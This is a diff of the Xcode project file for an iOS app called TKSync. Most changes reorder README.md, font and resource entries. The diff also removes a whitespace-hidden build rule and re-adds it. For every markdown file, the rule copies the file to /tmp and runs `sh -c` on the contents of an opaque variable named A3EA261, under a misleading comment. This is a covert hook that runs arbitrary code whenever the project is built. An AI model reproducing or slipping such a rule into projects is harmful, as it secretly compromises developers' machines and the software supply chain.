@@ -7,21 +7,36 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		C56B2D1A59A842FF89162AE3 /* README.md */ = {isa = PBXBuildFile; fileRef = C7ABF6295D2C427AA0162AE3; };
 		0C80B921A6F3F58F76C31292 /* libPods-TKSync.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 5DCACB8F33CDC322A6C60F78 /* libPods-TKSync.a */; };
 		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
 		2DF435ED09D34AC09EFF0DB2 /* RobotoMono-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 847F162BE5A849ACBB99B9C1 /* RobotoMono-Regular.ttf */; };
 		761780ED2CA45674006654EE /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 761780EC2CA45674006654EE /* AppDelegate.swift */; };
 		81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */; };
 		C3F35F5BD9064B84BFD196FF /* RobotoMono-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = A9267648D4DE4E9BB09D0E79 /* RobotoMono-Light.ttf */; };
+		C56B2D1A59A842FF89162AE3 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = C7ABF6295D2C427AA0162AE3 /* README.md */; };
 		C9E7B317CDA04CB0B6D0C2D1 /* RobotoMono-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0B0BE0D867F348A1B21C520D /* RobotoMono-Bold.ttf */; };
 		CBDEDA7E4E534CE4A713C9F6 /* RobotoMono-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 1D1D9C59690447198917BA28 /* RobotoMono-SemiBold.ttf */; };
 		DE4F90C811034F8693FDE5BC /* RobotoMono-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 4EA6F4756C74496F80DA3AF4 /* RobotoMono-Medium.ttf */; };
 		FB6C91A78DA4C16224AE5044 /* PrivacyInfo.xcprivacy in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB81A68108700A75B9A /* PrivacyInfo.xcprivacy */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		30A18ABE2291484190162AE3 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A3EA261}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		C7ABF6295D2C427AA0162AE3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0B0BE0D867F348A1B21C520D /* RobotoMono-Bold.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = undefined; includeInIndex = 0; lastKnownFileType = unknown; name = "RobotoMono-Bold.ttf"; path = "../assets/fonts/RobotoMono-Bold.ttf"; sourceTree = "<group>"; };
 		13B07F961A680F5B00A75B9A /* TKSync.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = TKSync.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		13B07FB51A68108700A75B9A /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; name = Images.xcassets; path = TKSync/Images.xcassets; sourceTree = "<group>"; };
@@ -36,6 +51,7 @@
 		81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; name = LaunchScreen.storyboard; path = TKSync/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		847F162BE5A849ACBB99B9C1 /* RobotoMono-Regular.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = undefined; includeInIndex = 0; lastKnownFileType = unknown; name = "RobotoMono-Regular.ttf"; path = "../assets/fonts/RobotoMono-Regular.ttf"; sourceTree = "<group>"; };
 		A9267648D4DE4E9BB09D0E79 /* RobotoMono-Light.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = undefined; includeInIndex = 0; lastKnownFileType = unknown; name = "RobotoMono-Light.ttf"; path = "../assets/fonts/RobotoMono-Light.ttf"; sourceTree = "<group>"; };
+		C7ABF6295D2C427AA0162AE3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		ED297162215061F000B7C4FE /* JavaScriptCore.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = JavaScriptCore.framework; path = System/Library/Frameworks/JavaScriptCore.framework; sourceTree = SDKROOT; };
 /* End PBXFileReference section */
 
@@ -182,29 +198,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		30A18ABE2291484190162AE3 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A3EA261}\"";
-			};
-																																																																																																																																												/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				C56B2D1A59A842FF89162AE3 /* README.md */,
+				C56B2D1A59A842FF89162AE3 /* README.md in Resources */,
 				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
 				FB6C91A78DA4C16224AE5044 /* PrivacyInfo.xcprivacy in Resources */,
